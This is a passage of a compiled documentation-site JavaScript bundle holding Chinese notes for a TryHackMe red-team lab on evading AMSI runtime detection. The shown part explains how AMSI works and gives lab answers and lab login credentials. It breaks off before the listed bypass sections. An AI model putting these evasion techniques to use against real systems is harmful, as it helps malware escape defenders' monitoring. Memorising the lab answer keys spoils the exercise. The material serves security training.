"use strict";(self.webpackChunkdemo=self.webpackChunkdemo||[]).push([[5878],{1727:(e,n,r)=>{r.d(n,{A:()=>i});const i=r.p+"assets/images/35e16d45ce27145fcdf231fdb8dcb35e-bcfbb1b154fff2c01cf14042a8f6ae02.png"},5804:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>o,contentTitle:()=>c,default:()=>h,frontMatter:()=>l,metadata:()=>i,toc:()=>d});const i=JSON.parse('{"id":"tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - \u8fd0\u884c\u65f6\u68c0\u6d4b\u89c4\u907f","title":"Runtime Detection Evasion - \u8fd0\u884c\u65f6\u68c0\u6d4b\u89c4\u907f","description":"\u5b66\u4e60\u5982\u4f55\u4f7f\u7528\u73b0\u4ee3\u7684\u5de5\u5177\u65e0\u5173\u65b9\u6cd5\u7ed5\u8fc7\u5e38\u89c1\u7684\u8fd0\u884c\u65f6\u68c0\u6d4b\u63aa\u65bd\uff0c\u4f8b\u5982 AMSI\u3002","source":"@site/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - \u8fd0\u884c\u65f6\u68c0\u6d4b\u89c4\u907f.md","sourceDirName":"tryhackme/red-teaming/host-evasions","slug":"/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - \u8fd0\u884c\u65f6\u68c0\u6d4b\u89c4\u907f","permalink":"/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - \u8fd0\u884c\u65f6\u68c0\u6d4b\u89c4\u907f","draft":false,"unlisted":false,"editUrl":"https://github.com/PgUp-code/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - \u8fd0\u884c\u65f6\u68c0\u6d4b\u89c4\u907f.md","tags":[],"version":"current","sidebarPosition":9,"frontMatter":{"sidebar_position":9},"sidebar":"tryhackme","previous":{"title":"Bypassing UAC - \u7ed5\u8fc7 UAC","permalink":"/docs/tryhackme/red-teaming/host-evasions/Bypassing UAC - \u7ed5\u8fc7 UAC"},"next":{"title":"Evading Logging and Monitoring - \u7ed5\u8fc7\u65e5\u5fd7\u8bb0\u5f55\u548c\u76d1\u63a7","permalink":"/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - \u7ed5\u8fc7\u65e5\u5fd7\u8bb0\u5f55\u548c\u76d1\u63a7"}}');var s=r(4848),t=r(8453);const l={sidebar_position:9},c=void 0,o={},d=[{value:"Introduction - \u7b80\u4ecb",id:"introduction---\u7b80\u4ecb",level:2},{value:"\u5b66\u4e60\u76ee\u6807",id:"\u5b66\u4e60\u76ee\u6807",level:3},{value:"Runtime Detections - \u8fd0\u884c\u65f6\u68c0\u6d4b",id:"runtime-detections---\u8fd0\u884c\u65f6\u68c0\u6d4b",level:2},{value:"AMSI \u6982\u8ff0",id:"amsi-\u6982\u8ff0",level:2},{value:"AMSI \u7684\u5b9e\u73b0\u673a\u5236",id:"amsi-\u7684\u5b9e\u73b0\u673a\u5236",level:2},{value:"PowerShell Downgrade - PowerShell \u964d\u7ea7\u653b\u51fb",id:"powershell-downgrade---powershell-\u964d\u7ea7\u653b\u51fb",level:2},{value:"PowerShell Reflection - PowerShell \u53cd\u5c04",id:"powershell-reflection---powershell-\u53cd\u5c04",level:2},{value:"Patching AMSI - \u4fee\u8865 AMSI",id:"patching-amsi---\u4fee\u8865-amsi",level:2},{value:"Automating for Fun and Profit - \u81ea\u52a8\u5316\u7684\u4e50\u8da3\u4e0e\u5229\u6da6",id:"automating-for-fun-and-profit---\u81ea\u52a8\u5316\u7684\u4e50\u8da3\u4e0e\u5229\u6da6",level:2},{value:"Conclusion - \u603b\u7ed3",id:"conclusion---\u603b\u7ed3",level:2}];function a(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",hr:"hr",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,t.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u5b66\u4e60\u5982\u4f55\u4f7f\u7528\u73b0\u4ee3\u7684\u5de5\u5177\u65e0\u5173\u65b9\u6cd5\u7ed5\u8fc7\u5e38\u89c1\u7684\u8fd0\u884c\u65f6\u68c0\u6d4b\u63aa\u65bd\uff0c\u4f8b\u5982 AMSI\u3002"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://tryhackme.com/room/runtimedetectionevasion",children:"TryHackMe | Runtime Detection Evasion"})}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"introduction---\u7b80\u4ecb",children:"Introduction - \u7b80\u4ecb"}),"\n",(0,s.jsx)(n.p,{children:"\u968f\u7740 PowerShell \u7248\u672c\u4f4e\u4e8e 3 \u7684\u53d1\u5e03\uff0c\u5fae\u8f6f\u63a8\u51fa\u4e86 AMSI\uff08\u53cd\u6076\u610f\u8f6f\u4ef6\u626b\u63cf\u63a5\u53e3\uff09\uff0c\u8fd9\u662f\u4e00\u79cd\u65e8\u5728\u963b\u6b62\u548c\u76d1\u63a7\u6301\u7eed\u5a01\u80c1\u7684\u8fd0\u884c\u65f6\u76d1\u63a7\u89e3\u51b3\u65b9\u6848\u3002"}),"\n",(0,s.jsx)(n.h3,{id:"\u5b66\u4e60\u76ee\u6807",children:"\u5b66\u4e60\u76ee\u6807"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u7406\u89e3\u8fd0\u884c\u65f6\u68c0\u6d4b\u7684\u76ee\u7684\u53ca\u5176\u5b9e\u73b0\u65b9\u5f0f\u3002"}),"\n",(0,s.jsx)(n.li,{children:"\u5b66\u4e60\u5e76\u5e94\u7528\u7ed5\u8fc7 AMSI \u7684\u6280\u672f\u3002"}),"\n",(0,s.jsx)(n.li,{children:"\u4e86\u89e3\u5e38\u89c1\u7684\u7f13\u89e3\u63aa\u65bd\u53ca\u5176\u53ef\u80fd\u7684\u66ff\u4ee3\u65b9\u6cd5\u3002"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u8fd0\u884c\u65f6\u68c0\u6d4b\u63aa\u65bd\u5728\u6267\u884c\u6076\u610f\u4ee3\u7801\u65f6\u53ef\u80fd\u5e26\u6765\u8bf8\u591a\u963b\u788d\u548c\u96be\u9898\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u4f5c\u4e3a\u653b\u51fb\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u591a\u79cd\u6280\u672f\u548c\u65b9\u6cd5\u6765\u7ed5\u8fc7\u5e38\u89c1\u7684\u8fd0\u884c\u65f6\u68c0\u6d4b\u89e3\u51b3\u65b9\u6848\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u672c\u6559\u7a0b\u5c06\u5f15\u7528\u591a\u4f4d\u4f5c\u8005\u548c\u7814\u7a76\u4eba\u5458\u7684\u7814\u7a76\u6210\u679c\uff0c\u6240\u6709\u529f\u52b3\u5f52\u5c5e\u4e8e\u5404\u81ea\u7684\u539f\u521b\u8005\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u5f00\u59cb\u672c\u6559\u7a0b\u4e4b\u524d\uff0c\u8bf7\u719f\u6089\u64cd\u4f5c\u7cfb\u7edf\u7684\u6574\u4f53\u67b6\u6784\u3002\u5efa\u8bae\u5177\u5907 C# \u548c PowerShell \u7684\u57fa\u7840\u7f16\u7a0b\u77e5\u8bc6\uff0c\u4f46\u5e76\u975e\u5fc5\u9700\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u4eec\u5df2\u63d0\u4f9b\u4e00\u53f0\u9884\u88c5\u4e86\u5b8c\u6210\u672c\u6559\u7a0b\u6240\u9700\u6587\u4ef6\u7684\u57fa\u7840 Windows \u673a\u5668\u3002\u60a8\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95ee\u8be5\u673a\u5668\uff0c\u6216\u4f7f\u7528\u4ee5\u4e0b\u51ed\u636e\u901a\u8fc7 RDP \u8fde\u63a5\uff1a"}),"\n",(0,s.jsxs)(n.p,{children:["\u673a\u5668 IP\uff1a",(0,s.jsx)(n.code,{children:"MACHINE_IP"}),"\r\n\u7528\u6237\u540d\uff1a",(0,s.jsx)(n.code,{children:"THM-Attacker"}),"\r\n\u5bc6\u7801\uff1a",(0,s.jsx)(n.code,{children:"Tryhackme!"})]}),"\n",(0,s.jsx)(n.p,{children:"\u63a5\u4e0b\u6765\u5c06\u6d89\u53ca\u5927\u91cf\u4fe1\u606f\uff0c\u8bf7\u7cfb\u597d\u5b89\u5168\u5e26\uff0c\u5e76\u786e\u8ba4\u6700\u8fd1\u7684\u706d\u706b\u5668\u4f4d\u7f6e\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"runtime-detections---\u8fd0\u884c\u65f6\u68c0\u6d4b",children:"Runtime Detections - \u8fd0\u884c\u65f6\u68c0\u6d4b"}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u6267\u884c\u4ee3\u7801\u6216\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u65e0\u8bba\u4f7f\u7528\u4f55\u79cd\u89e3\u91ca\u5668\uff0c\u51e0\u4e4e\u90fd\u4f1a\u7ecf\u8fc7\u4e00\u4e2a\u8fd0\u884c\u65f6\u73af\u5883\u3002\u8fd9\u5728\u4f7f\u7528 Windows API \u8c03\u7528\u548c\u4e0e .NET \u4ea4\u4e92\u65f6\u6700\u4e3a\u5e38\u89c1\u3002",(0,s.jsxs)(n.a,{href:"https://docs.microsoft.com/en-us/dotnet/standard/clr",children:["CLR\uff08",(0,s.jsx)(n.strong,{children:"C"}),"ommon ",(0,s.jsx)(n.strong,{children:"L"}),"anguage ",(0,s.jsx)(n.strong,{children:"R"}),"untime\uff0c\u516c\u5171\u8bed\u8a00\u8fd0\u884c\u65f6\uff09"]}),"\u548c",(0,s.jsxs)(n.a,{href:"https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview",children:["DLR\uff08",(0,s.jsx)(n.strong,{children:"D"}),"ynamic ",(0,s.jsx)(n.strong,{children:"L"}),"anguage ",(0,s.jsx)(n.strong,{children:"R"}),"untime\uff0c\u52a8\u6001\u8bed\u8a00\u8fd0\u884c\u65f6\uff09"]}),"\u662f .NET \u7684\u8fd0\u884c\u65f6\u73af\u5883\uff0c\u662f\u5728 Windows \u7cfb\u7edf\u4e2d\u6700\u5e38\u9047\u5230\u7684\u8fd0\u884c\u65f6\u73af\u5883\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u672c\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u4e0d\u4f1a\u6df1\u5165\u63a2\u8ba8\u8fd0\u884c\u65f6\u7684\u5177\u4f53\u673a\u5236\uff0c\u800c\u662f\u4e13\u6ce8\u4e8e\u5b83\u4eec\u7684\u76d1\u63a7\u65b9\u5f0f\u4ee5\u53ca\u6076\u610f\u4ee3\u7801\u7684\u68c0\u6d4b\u65b9\u6cd5\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u8fd0\u884c\u65f6\u68c0\u6d4b\u63aa\u65bd\u4f1a\u5728\u4ee3\u7801\u8fdb\u5165\u8fd0\u884c\u65f6\u4e4b\u524d\u5bf9\u5176\u8fdb\u884c\u626b\u63cf\uff0c\u5e76\u5224\u65ad\u662f\u5426\u4e3a\u6076\u610f\u4ee3\u7801\u3002\u6839\u636e\u5177\u4f53\u7684\u68c0\u6d4b\u673a\u5236\u548c\u6280\u672f\uff0c\u6b64\u68c0\u6d4b\u53ef\u80fd\u57fa\u4e8e\u5b57\u7b26\u4e32\u7279\u5f81\u3001\u542f\u53d1\u5f0f\u5206\u6790\u6216\u884c\u4e3a\u5206\u6790\u3002\u5982\u679c\u4ee3\u7801\u88ab\u6000\u7591\u4e3a\u6076\u610f\u4ee3\u7801\uff0c\u5b83\u5c06\u88ab\u8d4b\u4e88\u4e00\u4e2a\u6570\u503c\uff0c\u82e5\u8be5\u6570\u503c\u5728\u6307\u5b9a\u8303\u56f4\u5185\uff0c\u5219\u53ef\u80fd\u4f1a\u7ec8\u6b62\u6267\u884c\uff0c\u751a\u81f3\u9694\u79bb\u6216\u5220\u9664\u8be5\u6587\u4ef6/\u4ee3\u7801\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u8fd0\u884c\u65f6\u68c0\u6d4b\u63aa\u65bd\u4e0d\u540c\u4e8e\u4f20\u7edf\u7684\u6740\u6bd2\u8f6f\u4ef6\uff0c\u524d\u8005\u4f1a\u76f4\u63a5\u4ece\u5185\u5b58\u548c\u8fd0\u884c\u65f6\u73af\u5883\u4e2d\u8fdb\u884c\u626b\u63cf\u3002\u540c\u65f6\uff0c\u6740\u6bd2\u8f6f\u4ef6\u4ea7\u54c1\u4e5f\u53ef\u80fd\u91c7\u7528\u8fd9\u4e9b\u8fd0\u884c\u65f6\u68c0\u6d4b\u673a\u5236\uff0c\u4ee5\u4fbf\u66f4\u6df1\u5165\u5730\u5206\u6790\u4ee3\u7801\u4e2d\u53d1\u8d77\u7684\u8c03\u7528\u548c\u94a9\u5b50\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6740\u6bd2\u8f6f\u4ef6\u4ea7\u54c1\u53ef\u80fd\u5c06\u8fd0\u884c\u65f6\u68c0\u6d4b\u6d41/\u6570\u636e\u4f5c\u4e3a\u5176\u542f\u53d1\u5f0f\u5206\u6790\u7684\u4e00\u90e8\u5206\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u672c\u6559\u7a0b\u5c06\u4e3b\u8981\u805a\u7126\u4e8e ",(0,s.jsxs)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal",children:["AMSI\uff08",(0,s.jsx)(n.strong,{children:"A"}),"nti-",(0,s.jsx)(n.strong,{children:"M"}),"alware ",(0,s.jsx)(n.strong,{children:"S"}),"can ",(0,s.jsx)(n.strong,{children:"I"}),"nterface\uff0c\u53cd\u6076\u610f\u8f6f\u4ef6\u626b\u63cf\u63a5\u53e3\uff09"]}),"\u3002AMSI \u662f Windows \u539f\u751f\u81ea\u5e26\u7684\u8fd0\u884c\u65f6\u68c0\u6d4b\u673a\u5236\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u63a5\u53e3\u4f9b\u5176\u4ed6\u4ea7\u54c1\u548c\u89e3\u51b3\u65b9\u6848\u4f7f\u7528\u3002"]}),"\n",(0,s.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,s.jsx)(n.p,{children:"Windows \u539f\u751f\u81ea\u5e26\u7684\u8fd0\u884c\u65f6\u68c0\u6d4b\u673a\u5236\u662f\u4ec0\u4e48\uff1f"}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"AMSI\n"})})]}),"\n",(0,s.jsx)(n.h2,{id:"amsi-\u6982\u8ff0",children:"AMSI \u6982\u8ff0"}),"\n",(0,s.jsxs)(n.p,{children:["AMSI\uff08",(0,s.jsx)(n.strong,{children:"A"}),"nti-",(0,s.jsx)(n.strong,{children:"M"}),"alware ",(0,s.jsx)(n.strong,{children:"S"}),"can ",(0,s.jsx)(n.strong,{children:"I"}),"nterface\uff0c\u53cd\u6076\u610f\u8f6f\u4ef6\u626b\u63cf\u63a5\u53e3\uff09\u662f\u4e00\u79cd PowerShell \u5b89\u5168\u529f\u80fd\uff0c\u5141\u8bb8\u4efb\u4f55\u5e94\u7528\u7a0b\u5e8f\u6216\u670d\u52a1\u76f4\u63a5\u96c6\u6210\u5230\u53cd\u6076\u610f\u8f6f\u4ef6\u4ea7\u54c1\u4e2d\u3002Defender \u5229\u7528 AMSI \u5728 .NET \u8fd0\u884c\u65f6\u5185\u5bf9\u6709\u6548\u8f7d\u8377\u548c\u811a\u672c\u5728\u6267\u884c\u524d\u8fdb\u884c\u626b\u63cf\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u5fae\u8f6f\u8868\u793a\uff1a\u201cWindows \u53cd\u6076\u610f\u8f6f\u4ef6\u626b\u63cf\u63a5\u53e3 (AMSI) \u662f\u4e00\u79cd\u901a\u7528\u63a5\u53e3\u6807\u51c6\uff0c\u5141\u8bb8\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u548c\u670d\u52a1\u4e0e\u8ba1\u7b97\u673a\u4e0a\u5b58\u5728\u7684\u4efb\u4f55\u53cd\u6076\u610f\u8f6f\u4ef6\u4ea7\u54c1\u96c6\u6210\u3002AMSI \u53ef\u4e3a\u7ec8\u7aef\u7528\u6237\u53ca\u5176\u6570\u636e\u3001\u5e94\u7528\u7a0b\u5e8f\u548c\u5de5\u4f5c\u8d1f\u8f7d\u63d0\u4f9b\u589e\u5f3a\u7684\u6076\u610f\u8f6f\u4ef6\u9632\u62a4\u3002\u201d"}),"\n",(0,s.jsxs)(n.p,{children:["\u5173\u4e8e AMSI \u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 ",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/amsi/",children:"Windows \u6587\u6863"}),"\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"AMSI \u4f1a\u6839\u636e\u626b\u63cf\u7ed3\u679c\u7684\u54cd\u5e94\u4ee3\u7801\u51b3\u5b9a\u5176\u884c\u4e3a\u3002\u4ee5\u4e0b\u662f\u53ef\u80fd\u7684\u54cd\u5e94\u4ee3\u7801\u5217\u8868\uff1a"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.code,{children:"AMSI_RESULT_CLEAN = 0"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.code,{children:"AMSI_RESULT_NOT_DETECTED = 1"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.code,{children:"AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.code,{children:"AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.code,{children:"AMSI_RESULT_DETECTED = 32768"})}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u4e9b\u54cd\u5e94\u4ee3\u7801\u4ec5\u5728 AMSI \u7684\u540e\u53f0\u6216\u901a\u8fc7\u7b2c\u4e09\u65b9\u5b9e\u73b0\u4e2d\u62a5\u544a\u3002\u5982\u679c AMSI \u68c0\u6d4b\u5230\u6076\u610f\u7ed3\u679c\uff0c\u5b83\u5c06\u7ec8\u6b62\u6267\u884c\u5e76\u53d1\u9001\u4ee5\u4e0b\u9519\u8bef\u6d88\u606f\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:"PS C:Users\\Tryhackme> 'Invoke-Hacks'\r\nAt line:1 char:1\r\n+ \"Invoke-Hacks\"\r\n+ ~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\n        + CategoryInfo          : ParserError: (:) []. ParentContainsErrorRecordException\r\n        + FullyQualifiedErrorId : ScriptContainedMaliciousContent\n"})}),"\n",(0,s.jsx)(n.p,{children:"AMSI \u5df2\u5b8c\u5168\u96c6\u6210\u5230\u4ee5\u4e0b Windows \u7ec4\u4ef6\u4e2d\uff1a"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u7528\u6237\u5e10\u6237\u63a7\u5236 (UAC)"}),"\n",(0,s.jsx)(n.li,{children:"PowerShell"}),"\n",(0,s.jsx)(n.li,{children:"Windows Script Host\uff08wscript \u548c cscript\uff09"}),"\n",(0,s.jsx)(n.li,{children:"JavaScript \u548c VBScript"}),"\n",(0,s.jsx)(n.li,{children:"Office VBA \u5b8f"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u4f5c\u4e3a\u653b\u51fb\u8005\uff0c\u5728\u9488\u5bf9\u4e0a\u8ff0\u7ec4\u4ef6\u65f6\uff0c\u6211\u4eec\u9700\u8981\u7559\u610f AMSI \u53ca\u5176\u5728\u6267\u884c\u4ee3\u7801\u6216\u5229\u7528\u7ec4\u4ef6\u65f6\u7684\u5177\u4f53\u5b9e\u73b0\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u4e0b\u4e00\u4e2a\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u5c06\u4ecb\u7ecd AMSI \u5728 Windows \u4e2d\u7684\u5de5\u4f5c\u539f\u7406\u53ca\u5176\u5b9e\u73b0\u7684\u6280\u672f\u7ec6\u8282\u3002"}),"\n",(0,s.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,s.jsx)(n.p,{children:"32768 \u5bf9\u5e94\u7684\u54cd\u5e94\u503c\u662f\u4ec0\u4e48\uff1f"}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"AMSI_RESULT_DETECTED\n"})})]}),"\n",(0,s.jsx)(n.h2,{id:"amsi-\u7684\u5b9e\u73b0\u673a\u5236",children:"AMSI \u7684\u5b9e\u73b0\u673a\u5236"}),"\n",(0,s.jsx)(n.p,{children:"AMSI \u7684\u5b9e\u73b0\u673a\u5236\u8f83\u4e3a\u590d\u6742\uff0c\u6d89\u53ca\u591a\u4e2a DLL \u4ee5\u53ca\u6839\u636e\u5176\u90e8\u7f72\u4f4d\u7f6e\u800c\u53d8\u5316\u7684\u6267\u884c\u7b56\u7565\u3002\u4ece\u5b9a\u4e49\u4e0a\u8bb2\uff0cAMSI \u4ec5\u662f\u5176\u4ed6\u53cd\u6076\u610f\u8f6f\u4ef6\u4ea7\u54c1\u7684\u4e00\u4e2a\u63a5\u53e3\uff1bAMSI \u4f1a\u6839\u636e\u6b63\u5728\u6267\u884c\u7684\u5185\u5bb9\u53ca\u5176\u6240\u5728\u5c42\u6b21\uff0c\u8c03\u7528\u591a\u4e2a\u63d0\u4f9b\u7a0b\u5e8f DLL \u548c API\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["AMSI \u7684\u5b9e\u73b0\u6765\u6e90\u4e8e ",(0,s.jsx)(n.code,{children:"System.Management.Automation.dll"}),"\uff0c\u8fd9\u662f Windows \u5f00\u53d1\u7684\u4e00\u4e2a .NET \u7a0b\u5e8f\u96c6\u3002\u6839\u636e\u5fae\u8f6f\u6587\u6863\u7684\u63cf\u8ff0\uff1a\u201c\u7a0b\u5e8f\u96c6\u662f .NET \u5e94\u7528\u7a0b\u5e8f\u5728\u90e8\u7f72\u3001\u7248\u672c\u63a7\u5236\u3001\u91cd\u7528\u3001\u6fc0\u6d3b\u8303\u56f4\u548c\u5b89\u5168\u6743\u9650\u65b9\u9762\u7684\u57fa\u672c\u5355\u4f4d\u3002\u201d"]}),"\n",(0,s.jsx)(n.p,{children:"\u8be5 .NET \u7a0b\u5e8f\u96c6\u4f1a\u6839\u636e\u89e3\u91ca\u5668\u4ee5\u53ca\u4ee3\u7801\u4f4d\u4e8e\u78c1\u76d8\u6216\u5185\u5b58\u4e2d\uff0c\u6765\u8c03\u7528\u5176\u4ed6 DLL \u548c API\u3002\u4e0b\u56fe\u5c55\u793a\u4e86\u6570\u636e\u5728\u5404\u5c42\u6b21\u4e2d\u5982\u4f55\u88ab\u89e3\u6784\u4ee5\u53ca\u5bf9\u5e94\u7684 DLL/API \u8c03\u7528\u3002"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:r(1727).A+"",width:"936",height:"521"})}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u4e0a\u9762\u7684\u56fe\u793a\u4e2d\uff0c\u6570\u636e\u7684\u6d41\u52a8\u5c06\u53d6\u51b3\u4e8e\u6240\u4f7f\u7528\u7684\u89e3\u91ca\u5668\uff08PowerShell/VBScript \u7b49\uff09\u3002\u968f\u7740\u6570\u636e\u5728\u6a21\u578b\u4e2d\u7684\u6bcf\u4e00\u5c42\u6d41\u52a8\uff0c\u5404\u79cd API \u8c03\u7528\u548c\u63a5\u53e3\u4f1a\u88ab\u9010\u6b65\u5b9e\u73b0\u3002\u7406\u89e3 AMSI \u7684\u5b8c\u6574\u6a21\u578b\u975e\u5e38\u91cd\u8981\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u62c6\u89e3\u4e3a\u6838\u5fc3\u7ec4\u4ef6\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:r(9243).A+"",width:"981",height:"181"})}),"\n",(0,s.jsx)(n.p,{children:"\u6ce8\u610f\uff1aAMSI \u4ec5\u5728\u4ece\u5185\u5b58\u52a0\u8f7d\u5e76\u901a\u8fc7 CLR \u6267\u884c\u65f6\u624d\u4f1a\u88ab\u5b9e\u73b0\u3002\u5982\u679c\u4ee3\u7801\u4f4d\u4e8e\u78c1\u76d8\u4e0a\uff0c\u5219\u5047\u8bbe\u5df2\u7ecf\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u7531 MsMpEng.exe\uff08Windows Defender\uff09\u5b9e\u73b0\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u4eec\u7684\u5927\u90e8\u5206\u7814\u7a76\u548c\u5df2\u77e5\u7684\u7ed5\u8fc7\u65b9\u6cd5\u90fd\u96c6\u4e2d\u5728 Win32 API \u5c42\uff0c\u64cd\u4f5c ",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer",children:"AmsiScanBuffer"})," API \u8c03\u7528\u4e0a\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u4f60\u8fd8\u53ef\u80fd\u6ce8\u610f\u5230 AMSI \u7684\u201c\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u201d\u63a5\u53e3\u3002\u50cf\u6740\u6bd2\u8f6f\u4ef6\u4f9b\u5e94\u5546\u8fd9\u6837\u7684\u7b2c\u4e09\u65b9\u53ef\u4ee5\u4ece\u4ed6\u4eec\u7684\u4ea7\u54c1\u4e2d\u5b9e\u73b0 AMSI\u3002\u5fae\u8f6f\u6587\u6863\u4e2d\u6709 ",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions",children:"AMSI \u51fd\u6570"})," \u548c ",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream",children:"AMSI \u6d41\u63a5\u53e3"}),"\u3002"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5206\u89e3 AMSI PowerShell \u5b9e\u73b0\u7684\u4ee3\u7801\uff0c\u66f4\u597d\u5730\u7406\u89e3\u5176\u5b9e\u73b0\u65b9\u5f0f\u4ee5\u53ca\u5982\u4f55\u68c0\u67e5\u53ef\u7591\u5185\u5bb9\u3002\u4e3a\u4e86\u627e\u51fa AMSI \u88ab\u5b9e\u73b0\u7684\u4f4d\u7f6e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7531 ",(0,s.jsx)(n.a,{href:"https://github.com/cobbr",children:"Cobbr"})," \u7ef4\u62a4\u7684 ",(0,s.jsx)(n.a,{href:"https://github.com/PowerShell/PowerShell/compare/master...cobbr:master",children:"InsecurePowerShell"}),"\u3002InsecurePowerShell \u662f PowerShell \u7684\u4e00\u4e2a GitHub \u5206\u652f\uff0c\u5df2\u79fb\u9664\u5b89\u5168\u529f\u80fd\uff1b\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u6bd4\u8f83\u7684\u63d0\u4ea4\u5e76\u89c2\u5bdf\u4efb\u4f55\u5b89\u5168\u7279\u6027\u3002AMSI \u4ec5\u5728 ",(0,s.jsx)(n.code,{children:"src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs"})," \u4e2d\u7684\u5341\u4e8c\u884c\u4ee3\u7801\u4e2d\u5b9e\u73b0\u3002\u4ee5\u4e0b\u662f\u8fd9\u5341\u4e8c\u884c\u4ee3\u7801\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-cpp",children:'var scriptExtent = scriptBlockAst.Extent;\r\n if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)\r\n {\r\n  var parseError = new ParseError(scriptExtent, "ScriptContainedMaliciousContent", ParserStrings.ScriptContainedMaliciousContent);\r\n  throw new ParseException(new[] { parseError });\r\n }\r\n\r\n if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null)\r\n {\r\n  HasSuspiciousContent = true;\r\n }\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5bf9 AMSI \u5b9e\u73b0\u673a\u5236\u7684\u4e86\u89e3\u4ee5\u53ca\u4ed6\u4eba\u7684\u7814\u7a76\uff0c\u521b\u5efa\u5e76\u4f7f\u7528\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u6ee5\u7528\u548c\u89c4\u907f AMSI \u6216\u5176\u5de5\u5177\u3002"}),"\n",(0,s.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,s.jsx)(n.p,{children:"\u5982\u679c\u6587\u4ef6\u4ec5\u5728\u78c1\u76d8\u4e0a\uff0cAMSI 